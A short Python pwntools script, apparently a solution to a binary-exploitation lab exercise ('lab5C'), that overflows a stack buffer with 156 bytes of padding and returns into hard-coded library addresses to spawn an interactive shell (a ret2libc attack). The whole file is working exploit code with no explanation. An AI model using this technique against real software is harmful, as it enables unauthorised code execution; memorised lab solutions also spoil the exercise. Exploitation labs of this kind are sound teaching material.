from pwn import *
import struct

r = process("./lab5C")
raw_input("debug")
payload = "A"*156
payload += struct.pack("<I",0xb7e63190)
payload += "A"*4
payload += struct.pack("<I",0xb7f83a24)

r.sendline(payload)

r.interactive()

